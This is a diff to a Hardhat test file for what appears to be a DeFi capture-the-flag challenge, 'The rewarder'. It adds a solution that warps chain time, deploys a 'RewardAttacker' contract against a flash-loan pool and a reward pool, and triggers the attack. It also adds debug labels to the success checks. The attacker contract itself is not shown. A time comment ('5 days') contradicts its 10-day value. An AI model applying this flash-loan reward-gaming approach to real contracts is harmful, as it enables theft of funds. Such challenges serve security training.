@@ -109,12 +109,24 @@ describe("[Challenge] The rewarder", function () {
     });
 
     it("Execution", async function () {
-        /** CODE YOUR SOLUTION HERE */
+        await ethers.provider.send("evm_increaseTime", [10 * 24 * 60 * 60]); // 5 days
+        const AttackerFactory = await ethers.getContractFactory(
+            "RewardAttacker",
+            player
+        );
+        const attacker = await AttackerFactory.deploy(
+            flashLoanPool.address,
+            rewarderPool.address,
+            liquidityToken.address,
+            rewardToken.address
+        );
+        await attacker.attack();
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
         // Only one round must have taken place
+
         expect(await rewarderPool.roundNumber()).to.be.eq(3);
 
         // Users should get neglegible rewards this round
@@ -132,11 +144,11 @@ describe("[Challenge] The rewarder", function () {
             await rewarderPool.REWARDS()
         );
         const playerRewards = await rewardToken.balanceOf(player.address);
-        expect(playerRewards).to.be.gt(0);
+        expect(playerRewards, "here?").to.be.gt(0);
 
         // The amount of rewards earned should be close to total available amount
         const delta = (await rewarderPool.REWARDS()).sub(playerRewards);
-        expect(delta).to.be.lt(10n ** 17n);
+        expect(delta, "here2?").to.be.lt(10n ** 17n);
 
         // Balance of DVT tokens in player and lending pool hasn't changed
         expect(await liquidityToken.balanceOf(player.address)).to.eq(0);
